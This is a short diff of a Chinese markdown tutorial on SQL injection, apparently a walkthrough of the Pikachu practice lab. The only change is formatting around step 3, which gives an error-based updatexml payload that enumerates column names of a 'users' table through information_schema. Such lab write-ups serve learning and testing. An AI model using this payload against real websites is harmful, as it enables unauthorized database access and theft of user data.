@@ -204,7 +204,7 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 ![alvlavnkjadvkadsvavd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/alvlavnkjadvkadsvavd)
 
-3.爆列名`1+or+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema='pikachu'+and+table_name='users')),1)`
+3.爆列名```1+or+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema='pikachu'+and+table_name='users')),1)```
 
 ![avavnajnvdjaduvhdvd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avavnajnvdjaduvhdvd)
 
